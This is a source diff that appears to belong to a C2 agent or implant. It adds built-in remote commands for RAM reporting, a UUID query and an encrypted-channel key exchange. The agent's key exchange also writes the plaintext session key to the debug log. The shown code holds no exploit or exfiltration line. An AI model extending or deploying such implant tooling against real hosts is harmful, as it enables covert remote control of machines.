@@ -30,6 +30,9 @@
 #include <unistd.h>
 #include <sigar.h>
 #include <time.h>
+#include <eio.h>
+
+#include <mbedtls/pk.h>
 
 #ifndef IS_WINDOWS
 #include <pwd.h>
@@ -40,6 +43,9 @@
 #include <tabs.h>
 #include <tlv_types.h>
 #include <tlv.h>
+#include <group.h>
+#include <crypt.h>
+#include <log.h>
 
 #define BUILTIN_BASE 1
 
@@ -71,12 +77,30 @@
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        BUILTIN_BASE, \
                        API_CALL + 6)
+#define BUILTIN_UUID \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       BUILTIN_BASE, \
+                       API_CALL + 7)
+#define BUILTIN_SECURE \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       BUILTIN_BASE, \
+                       API_CALL + 8)
+#define BUILTIN_UNSECURE \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       BUILTIN_BASE, \
+                       API_CALL + 9)
 
-#define TLV_TYPE_PLATFORM TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE)
-#define TLV_TYPE_VERSION  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 1)
-#define TLV_TYPE_ARCH     TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 2)
-#define TLV_TYPE_MACHINE  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 3)
-#define TLV_TYPE_VENDOR   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 4)
+#define TLV_TYPE_PLATFORM  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE)
+#define TLV_TYPE_VERSION   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 1)
+#define TLV_TYPE_ARCH      TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 2)
+#define TLV_TYPE_MACHINE   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 3)
+#define TLV_TYPE_VENDOR    TLV_TYPE_CUSTOM(TLV_TYPE_STRING, BUILTIN_BASE, API_TYPE + 4)
+
+#define TLV_TYPE_RAM_USED  TLV_TYPE_CUSTOM(TLV_TYPE_INT, BUILTIN_BASE, API_TYPE)
+#define TLV_TYPE_RAM_TOTAL TLV_TYPE_CUSTOM(TLV_TYPE_INT, BUILTIN_BASE, API_TYPE + 1)
+
+#define TLV_TYPE_PUBLIC_KEY  TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, BUILTIN_BASE, API_TYPE)
+#define TLV_TYPE_KEY         TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, BUILTIN_BASE, API_TYPE + 1)
 
 static tlv_pkt_t *builtin_quit(c2_t *c2)
 {
@@ -85,16 +109,19 @@ static tlv_pkt_t *builtin_quit(c2_t *c2)
 
 static tlv_pkt_t *builtin_add_tab_disk(c2_t *c2)
 {
+    core_t *core;
     char filename[128];
     tlv_pkt_t *result;
 
+    core = c2->data;
+
     if (tlv_pkt_get_string(c2->request, TLV_TYPE_FILENAME, filename) > 0)
     {
-        if (tabs_add(&c2->dynamic.tabs, c2->dynamic.t_count, filename, NULL, strlen(filename)+1, c2) == 0)
+        if (tabs_add(&core->tabs, core->t_count, filename, NULL, strlen(filename)+1, c2) == 0)
         {
             result = api_craft_tlv_pkt(API_CALL_SUCCESS);
-            tlv_pkt_add_int(result, TLV_TYPE_TAB_ID, c2->dynamic.t_count);
-            c2->dynamic.t_count++;
+            tlv_pkt_add_u32(result, TLV_TYPE_TAB_ID, core->t_count);
+            core->t_count++;
 
             return result;
         }
@@ -105,17 +132,20 @@ static tlv_pkt_t *builtin_add_tab_disk(c2_t *c2)
 
 static tlv_pkt_t *builtin_add_tab_buffer(c2_t *c2)
 {
+    core_t *core;
     int tab_size;
     unsigned char *tab;
     tlv_pkt_t *result;
 
+    core = c2->data;
+
     if ((tab_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_TAB, &tab)) > 0)
     {
-        if (tabs_add(&c2->dynamic.tabs, c2->dynamic.t_count, NULL, tab, tab_size, c2) == 0)
+        if (tabs_add(&core->tabs, core->t_count, NULL, tab, tab_size, c2) == 0)
         {
             result = api_craft_tlv_pkt(API_CALL_SUCCESS);
-            tlv_pkt_add_int(result, TLV_TYPE_TAB_ID, c2->dynamic.t_count);
-            c2->dynamic.t_count++;
+            tlv_pkt_add_u32(result, TLV_TYPE_TAB_ID, core->t_count);
+            core->t_count++;
             free(tab);
 
             return result;
@@ -131,11 +161,13 @@ static tlv_pkt_t *builtin_add_tab_buffer(c2_t *c2)
 
 static tlv_pkt_t *builtin_delete_tab(c2_t *c2)
 {
+    core_t *core;
     int tab_id;
 
-    tlv_pkt_get_int(c2->request, TLV_TYPE_INT, &tab_id);
+    core = c2->data;
+    tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &tab_id);
 
-    if (tabs_delete(&c2->dynamic.tabs, tab_id) == 0)
+    if (tabs_delete(&core->tabs, tab_id) == 0)
     {
         return api_craft_tlv_pkt(API_CALL_SUCCESS);
     }
@@ -171,11 +203,22 @@ static tlv_pkt_t *builtin_sysinfo(c2_t *c2)
     int status;
     tlv_pkt_t *result;
     sigar_sys_info_t sysinfo;
+    sigar_mem_t memory;
+    core_t *core;
 
-    if ((status = sigar_sys_info_get(c2->sigar, &sysinfo)) != SIGAR_OK)
+    core = c2->data;
+
+    if ((status = sigar_sys_info_get(core->sigar, &sysinfo)) != SIGAR_OK)
     {
         log_debug("* Failed to sigar sysinfo (%s)\n",
-                  sigar_strerror(c2->sigar, status));
+                  sigar_strerror(core->sigar, status));
+        return api_craft_tlv_pkt(API_CALL_FAIL);
+    }
+
+    if ((status = sigar_mem_get(core->sigar, &memory)) != SIGAR_OK)
+    {
+        log_debug("* Failed to sigar memory (%s)\n",
+                  sigar_strerror(core->sigar, status));
         return api_craft_tlv_pkt(API_CALL_FAIL);
     }
 
@@ -186,6 +229,9 @@ static tlv_pkt_t *builtin_sysinfo(c2_t *c2)
     tlv_pkt_add_string(result, TLV_TYPE_ARCH, sysinfo.arch);
     tlv_pkt_add_string(result, TLV_TYPE_MACHINE, sysinfo.machine);
     tlv_pkt_add_string(result, TLV_TYPE_VENDOR, sysinfo.vendor);
+
+    tlv_pkt_add_u64(result, TLV_TYPE_RAM_TOTAL, memory.total);
+    tlv_pkt_add_u64(result, TLV_TYPE_RAM_USED, memory.used);
 
     return result;
 }
@@ -213,6 +259,85 @@ static tlv_pkt_t *builtin_whoami(c2_t *c2)
     return result;
 }
 
+static tlv_pkt_t *builtin_uuid(c2_t *c2)
+{
+    core_t *core;
+    tlv_pkt_t *result;
+
+    core = c2->data;
+
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    tlv_pkt_add_string(result, TLV_TYPE_UUID, core->uuid);
+
+    return result;
+}
+
+static void builtin_enable_security(struct eio_req *request)
+{
+    int status;
+    c2_t *c2;
+
+    c2 = request->data;
+    c2_enqueue_tlv(c2, c2->response);
+
+    tlv_pkt_destroy(c2->request);
+    tlv_pkt_destroy(c2->response);
+
+    crypt_set_key(c2->crypt, c2->crypt->next_key);
+    crypt_set_secure(c2->crypt, STAT_SECURE);
+
+    free(c2->crypt->next_key);
+}
+
+static tlv_pkt_t *builtin_secure(c2_t *c2)
+{
+    size_t length;
+
+    int pkey_length;
+    int key_length;
+
+    char pkey[4096];
+    unsigned char buffer[MBEDTLS_MPI_MAX_SIZE];
+
+    if ((pkey_length = tlv_pkt_get_string(c2->request, TLV_TYPE_PUBLIC_KEY, pkey)) <= 0)
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL);
+    }
+    pkey_length++;
+
+    if ((key_length = crypt_generate_key(c2->crypt, &c2->crypt->next_key)) < 0)
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL);
+    }
+
+    memset(buffer, '\0', MBEDTLS_MPI_MAX_SIZE);
+    length = crypt_pkcs_encrypt(c2->crypt->next_key, key_length, (unsigned char *)pkey,
+                                pkey_length, buffer);
+
+    if (length <= 0)
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL);
+    }
+
+    c2->response = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    tlv_pkt_add_bytes(c2->response, TLV_TYPE_KEY, buffer, length);
+
+    log_debug("Symmetric key: \n");
+    log_hexdump(c2->crypt->next_key, 32);
+
+    log_debug("Symmetric key encrypted with PKCS: \n");
+    log_hexdump(buffer, length);
+
+    eio_custom(builtin_enable_security, 0, NULL, c2);
+    return NULL;
+}
+
+static tlv_pkt_t *builtin_unsecure(c2_t *c2)
+{
+    crypt_set_secure(c2->crypt, STAT_NOT_SECURE);
+    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+}
+
 void register_builtin_api_calls(api_calls_t **api_calls)
 {
     api_call_register(api_calls, BUILTIN_QUIT, builtin_quit);
@@ -222,6 +347,9 @@ void register_builtin_api_calls(api_calls_t **api_calls)
     api_call_register(api_calls, BUILTIN_SYSINFO, builtin_sysinfo);
     api_call_register(api_calls, BUILTIN_TIME, builtin_time);
     api_call_register(api_calls, BUILTIN_WHOAMI, builtin_whoami);
+    api_call_register(api_calls, BUILTIN_UUID, builtin_uuid);
+    api_call_register(api_calls, BUILTIN_SECURE, builtin_secure);
+    api_call_register(api_calls, BUILTIN_UNSECURE, builtin_unsecure);
 }
 
 #endif
